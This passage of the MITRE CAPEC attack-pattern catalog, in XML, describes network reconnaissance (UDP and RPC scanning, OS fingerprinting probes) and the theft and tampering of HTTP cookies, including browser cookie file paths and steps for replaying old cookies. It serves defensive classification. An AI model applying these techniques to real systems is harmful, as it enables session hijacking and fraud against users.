            <Resource>The ability to craft custom RPC datagrams for use during network reconnaissance via native OS utilities or a port scanning tool. By tailoring the bytes injected one can scan for specific RPC-registered services. Depending upon the method used it may be necessary to sniff the network in order to see the response.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Typically, an IDS/IPS system is very effective against this type of attack.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-158"/>
            <Reference External_Reference_ID="REF-34" Section="Section 7.5.2 RPC Grinding, pg. 156"/>
            <Reference External_Reference_ID="REF-130"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description, Description Summary, References, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="308" Name="UDP Scan" Abstraction="Detailed" Status="Stable">
         <Description>An adversary engages in UDP scanning to gather information about UDP port status on the target system. UDP scanning methods involve sending a UDP datagram to the target port and looking for evidence that the port is closed. Open UDP ports usually do not respond to UDP datagrams as there is no stateful mechanism within the protocol that requires building or establishing a session. Responses to UDP datagrams are therefore application specific and cannot be relied upon as a method of detecting an open port. UDP scanning relies heavily upon ICMP diagnostic messages in order to determine the status of a remote port. During a UDP scan, a datagram is sent to a target port. If an 'ICMP Type 3 Port unreachable' error message is returned then the port is considered closed. Different types of ICMP messages can indicate a filtered port. UDP scanning is slower than TCP scanning. The protocol characteristics of UDP make port scanning inherently more difficult than with TCP, as well as dependent upon ICMP for accurate scanning. Due to ambiguities that can arise between open ports and filtered ports, UDP scanning results often require a high degree of interpretation and further testing to refine. In general, UDP scanning results are less reliable or accurate than TCP-based scanning.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="300"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to send UDP datagrams to a host and receive ICMP error messages from that host. In cases where particular types of ICMP messaging is disallowed, the reliability of UDP scanning drops off sharply.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The ability to craft custom UDP Packets for use during network reconnaissance. This can be accomplished via the use of a port scanner, or via socket manipulation in a programming or scripting language. Packet injection tools are also useful. It is also necessary to trap ICMP diagnostic messages during this process. Depending upon the method used it may be necessary to sniff the network in order to see the response.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Firewalls or ACLs which block egress ICMP error types effectively prevent UDP scans from returning any useful information.</Mitigation>
            <Mitigation>UDP scanning is complicated by rate limiting mechanisms governing ICMP error messages.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 54-69"/>
            <Reference External_Reference_ID="REF-158"/>
            <Reference External_Reference_ID="REF-34" Section="Section 5.4 RPC Grinding, pg. 101"/>
            <Reference External_Reference_ID="REF-130"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description, Description Summary, References, Related_Weaknesses, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="309" Name="Network Topology Mapping" Abstraction="Standard" Status="Draft">
         <Description>An adversary engages in scanning activities to map network nodes, hosts, devices, and routes. Adversaries usually perform this type of network reconnaissance during the early stages of attack against an external network. Many types of scanning utilities are typically employed, including ICMP tools, network mappers, port scanners, and route testing utilities such as traceroute.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="169">
               <Exclude_Related Exclude_ID="512"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>None</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>Probing requires the ability to interactively send and receive data from a target, whereas passive listening requires a sufficient understanding of the protocol to analyze a preexisting channel of communication.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1016</Entry_ID>
               <Entry_Name>System Network Configuration Discovery</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1126</Entry_ID>
               <Entry_Name>System Network Connections Discovery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-130"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Taxonomy_Mappings</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="31" Name="Accessing/Intercepting/Modifying HTTP Cookies" Abstraction="Detailed" Status="Draft">
         <Description>This attack relies on the use of HTTP Cookies to store credentials, state information and other critical data on client systems. There are several different forms of this attack. The first form of this attack involves accessing HTTP Cookies to mine for potentially sensitive data contained therein. The second form involves intercepting this data as it is transmitted from client to server. This intercepted information is then used by the adversary to impersonate the remote user/session. The third form is when the cookie's content is modified by the adversary before it is sent back to the server. Here the adversary seeks to convince the target server to operate on this falsified information.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="39"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="150"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="157"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Obtain copy of cookie] The adversary first needs to obtain a copy of the cookie. The adversary may be a legitimate end user wanting to escalate privilege, or could be somebody sniffing on a network to get a copy of HTTP cookies.</Description>
               <Technique>Obtain cookie from local filesystem (e.g. C:\Documents and Settings\*\Cookies and C:\Documents and Settings\*\Application Data\Mozilla\Firefox\Profiles\*\cookies.txt in Windows)</Technique>
               <Technique>Sniff cookie using a network sniffer such as Wireshark</Technique>
               <Technique>Obtain cookie from local memory or filesystem using a utility such as the Firefox Cookie Manager or AnEC Cookie Editor.</Technique>
               <Technique>Steal cookie via a cross-site scripting attack.</Technique>
               <Technique>Guess cookie contents if it contains predictable information.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Obtain sensitive information from cookie] The adversary may be able to get sensitive information from the cookie. The web application developers may have assumed that cookies are not accessible by end users, and thus, may have put potentially sensitive information in them.</Description>
               <Technique>If cookie shows any signs of being encoded using a standard scheme such as base64, decode it.</Technique>
               <Technique>Analyze the cookie's contents to determine whether it contains any sensitive information.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[Modify cookie to subvert security controls.] The adversary may be able to modify or replace cookies to bypass security controls in the application.</Description>
               <Technique>Modify logical parts of cookie and send it back to server to observe the effects.</Technique>
               <Technique>Modify numeric parts of cookie arithmetically and send it back to server to observe the effects.</Technique>
               <Technique>Modify cookie bitwise and send it back to server to observe the effects.</Technique>
               <Technique>Replace cookie with an older legitimate cookie and send it back to server to observe the effects. This technique would be helpful in cases where the cookie contains a "points balance" for a given user where the points have some value. The user may spend his points and then replace his cookie with an older one to restore his balance.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Target server software must be a HTTP daemon that relies on cookies.</Prerequisite>
            <Prerequisite>The cookies must contain sensitive information.</Prerequisite>
            <Prerequisite>The adversary must be able to make HTTP requests to the server, and the cookie must be contained in the reply.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To overwrite session cookie data, and submit targeted attacks via HTTP</Skill>
            <Skill Level="High">Exploiting a remote buffer overflow generated by attack</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>A utility that allows for the viewing and modification of cookies. Many modern web browsers support this behavior.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Use input validation for cookies</Mitigation>
            <Mitigation>Design: Generate and validate MAC for cookies</Mitigation>
            <Mitigation>Implementation: Use SSL/TLS to protect cookie in transit</Mitigation>
            <Mitigation>Implementation: Ensure the web server implements all relevant security patches, many exploitable buffer overflows are fixed in patches issued for the software.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>There are two main attack vectors for exploiting poorly protected session variables like cookies. One is the local machine itself which can be exploited directly at the physical level or indirectly through XSS and phishing. In addition, the man in the middle attack relies on a network sniffer, proxy, or other intermediary to intercept the subject's credentials and use them to impersonate the digital subject on the host. The issue is that once the credentials are intercepted, impersonation is trivial for the adversary to accomplish if no other protection mechanisms are in place. See also: CVE-2010-5148 , CVE-2016-0353</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="565"/>
            <Related_Weakness CWE_ID="302"/>
            <Related_Weakness CWE_ID="311"/>
            <Related_Weakness CWE_ID="113"/>
            <Related_Weakness CWE_ID="539"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="315"/>
            <Related_Weakness CWE_ID="384"/>
            <Related_Weakness CWE_ID="472"/>
            <Related_Weakness CWE_ID="724"/>
            <Related_Weakness CWE_ID="602"/>
            <Related_Weakness CWE_ID="642"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Payload_Activation_Impact, Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="310" Name="Scanning for Vulnerable Software" Abstraction="Detailed" Status="Draft">
         <Description>An attacker engages in scanning activity to find vulnerable software versions or types, such as operating system versions or network services. Vulnerable or exploitable network configurations, such as improperly firewalled systems, or misconfigured systems in the DMZ or external network, provide windows of opportunity for an attacker. Common types of vulnerable software include unpatched operating systems or services (e.g FTP, Telnet, SMTP, SNMP) running on open ports that the attacker has identified. Attackers usually begin probing for vulnerable software once the external network has been port scanned and potential targets have been revealed.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="541"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Access to the network on which the targeted system resides.</Prerequisite>
            <Prerequisite>Software tools used to probe systems over a range of ports and protocols.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">To probe a system remotely without detection requires careful planning and patience.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Probing requires the ability to interactively send and receive data from a target, whereas passive listening requires a sufficient understanding of the protocol to analyze a preexisting channel of communication.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-130"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="312" Name="Active OS Fingerprinting" Abstraction="Standard" Status="Stable">
         <Description>An adversary engages in activity to detect the operating system or firmware version of a remote target by interrogating a device, server, or platform with a probe designed to solicit behavior that will reveal information about the operating systems or firmware in the environment. Operating System detection is possible because implementations of common protocols (Such as IP or TCP) differ in distinct ways. While the implementation differences are not sufficient to 'break' compatibility with the protocol the differences are detectable because the target will respond in unique ways to specific probing activity that breaks the semantic or logical rules of packet construction for a protocol. Different operating systems will have a unique response to the anomalous input, providing the basis to fingerprint the OS behavior. This type of OS fingerprinting can distinguish between operating system types and versions.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="224"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>
               <xhtml:p>Any type of active probing that involves non-standard packet headers requires the use of raw sockets, which is not available on particular operating systems (Microsoft Windows XP SP 2, for example). Raw socket manipulation on Unix/Linux requires root privileges.</xhtml:p>
               <xhtml:p>A tool capable of sending and receiving packets from a remote system.</xhtml:p>
            </Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1082</Entry_ID>
               <Entry_Name>System Information Discovery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-212" Section="Chapter 8. Remote OS Detection"/>
            <Reference External_Reference_ID="REF-130"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="313" Name="Passive OS Fingerprinting" Abstraction="Standard" Status="Stable">
         <Description>An adversary engages in activity to detect the version or type of OS software in a an environment by passively monitoring communication between devices, nodes, or applications. Passive techniques for operating system detection send no actual probes to a target, but monitor network or client-server communication between nodes in order to identify operating systems based on observed behavior as compared to a database of known signatures or values. While passive OS fingerprinting is not usually as reliable as active methods, it is generally better able to evade detection.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="224"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to monitor network communications.Access to at least one host, and the privileges to interface with the network interface card.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>Any tool capable of monitoring network communications, like a packet sniffer (e.g., Wireshark)</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-212" Section="Chapter 8. Remote OS Detection"/>
            <Reference External_Reference_ID="REF-130"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="317" Name="IP ID Sequencing Probe" Abstraction="Detailed" Status="Stable">
         <Description>This OS fingerprinting probe analyzes the IP 'ID' field sequence number generation algorithm of a remote host. Operating systems generate IP 'ID' numbers differently, allowing an attacker to identify the operating system of the host by examining how is assigns ID numbers when generating response packets. RFC 791 does not specify how ID numbers are chosen or their ranges, so ID sequence generation differs from implementation to implementation. There are two kinds of IP 'ID' sequence number analysis - IP 'ID' Sequencing: analyzing the IP 'ID' sequence generation algorithm for one protocol used by a host and Shared IP 'ID' Sequencing: analyzing the packet ordering via IP 'ID' values spanning multiple protocols, such as between ICMP and TCP.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="312"/>
         </Related_Attack_Patterns>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-212" Section="Chapter 8. Remote OS Detection"/>
            <Reference External_Reference_ID="REF-130"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Related_Attack_Patterns, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description, Description Summary, References, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="318" Name="IP 'ID' Echoed Byte-Order Probe" Abstraction="Detailed" Status="Stable">
         <Description>This OS fingerprinting probe tests to determine if the remote host echoes back the IP 'ID' value from the probe packet. An attacker sends a UDP datagram with an arbitrary IP 'ID' value to a closed port on the remote host to observe the manner in which this bit is echoed back in the ICMP error message. The identification field (ID) is typically utilized for reassembling a fragmented packet. Some operating systems or router firmware reverse the bit order of the ID field when echoing the IP Header portion of the original datagram within an ICMP error message.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="312"/>
         </Related_Attack_Patterns>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-212" Section="Chapter 8. Remote OS Detection"/>
            <Reference External_Reference_ID="REF-130"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Related_Attack_Patterns, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="319" Name="IP (DF) 'Don't Fragment Bit' Echoing Probe" Abstraction="Detailed" Status="Stable">
         <Description>This OS fingerprinting probe tests to determine if the remote host echoes back the IP 'DF' (Don't Fragment) bit in a response packet. An attacker sends a UDP datagram with the DF bit set to a closed port on the remote host to observe whether the 'DF' bit is set in the response packet. Some operating systems will echo the bit in the ICMP error message while others will zero out the bit in the response packet.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="312"/>
         </Related_Attack_Patterns>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-212" Section="Chapter 8. Remote OS Detection"/>
            <Reference External_Reference_ID="REF-130"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Related_Attack_Patterns, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="32" Name="XSS Through HTTP Query Strings" Abstraction="Detailed" Status="Draft">
         <Description>An adversary embeds malicious script code in the parameters of an HTTP query string and convinces a victim to submit the HTTP request that contains the query string to a vulnerable web application. The web application then procedes to use the values parameters without properly validation them first and generates the HTML code that will be executed by the victim's browser.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="591"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="588"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Spider] Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links he finds.</Description>
               <Technique>Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.</Technique>
               <Technique>Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
